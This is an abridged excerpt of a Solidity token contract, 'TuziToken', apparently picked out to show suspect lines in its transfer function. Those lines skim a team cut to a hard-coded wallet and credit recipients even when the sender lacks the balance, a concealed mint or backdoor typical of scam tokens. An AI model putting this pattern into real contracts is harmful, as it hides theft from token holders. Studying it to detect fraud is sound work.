...
// Submitted for Telegram: https://t.me/tuzitoken_bsc
...
contract  TuziToken  is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x479D0651860FEB6d78E62F538F00607379e35480] += _teamtoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_marketingfee > 0) {
        emit Transfer(form, 0x479D0651860FEB6d78E62F538F00607379e35480, _teamtoken);
        }
